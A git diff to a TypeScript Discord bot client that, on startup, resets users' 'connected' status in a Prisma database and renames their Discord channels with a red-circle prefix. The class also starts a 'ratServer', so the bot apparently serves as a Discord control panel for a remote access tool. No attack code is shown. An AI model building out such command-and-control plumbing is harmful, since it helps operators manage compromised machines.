@@ -1,4 +1,5 @@
-import { Client, Collection, ChatInputCommandInteraction } from "discord.js";
+import { Client, Collection, ChatInputCommandInteraction, TextChannel } from "discord.js";
+import { User } from "@prisma/client";
 import { PrismaClient, Prisma } from "@prisma/client";
 import { DefaultArgs } from "@prisma/client/runtime/library";
 import ICustomClient from "../interfaces/ICustomClient";
@@ -32,11 +33,36 @@ export default class CustomClient extends Client implements ICustomClient {
     }
     
     
-    Init(): void {
+    async Init(): Promise<void> {
         this.LoadHandlers();
         this.ratServer.start();
         this.login(this.config.token)
             .catch((err) => console.error(err));
+
+        let connected_users = await this.database.user.findMany({
+            where: {
+                connected: true
+            }
+        });
+        connected_users.forEach(async (user: User) => {
+            let channelId = user.channelId;
+            if (!channelId) return;
+            
+            let channel = await this.channels.fetch(channelId) as TextChannel;
+            if (!channel) return;
+
+            await channel.setName(`🔴${channel.name.substring(2, channel.name.length)}`);
+            console.log(`[DISCORD BOT] Set channel name to ${channel.name}`);
+        });
+
+        await this.database.user.updateMany({
+            data: {
+                connected: false
+            },
+            where: {
+                connected: true
+            }
+        });
     }
 
     LoadHandlers(): void {
